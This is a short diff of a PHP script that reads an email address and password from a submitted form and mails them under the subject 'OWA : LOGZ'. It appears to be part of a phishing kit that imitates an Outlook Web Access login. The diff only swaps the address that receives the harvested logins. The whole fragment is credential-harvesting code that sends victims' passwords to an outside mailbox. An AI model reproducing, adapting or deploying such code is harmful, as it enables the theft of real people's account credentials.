@@ -5,7 +5,7 @@ if(!empty($_POST)) {
  $email= $_POST['email'];
  $password = $_POST['password'];
  
-		$to = "007r3sultbox@gmail.com";
+		$to = "jeancollins9090@yandex.com";
 		
 		
          $subject = "OWA : LOGZ";
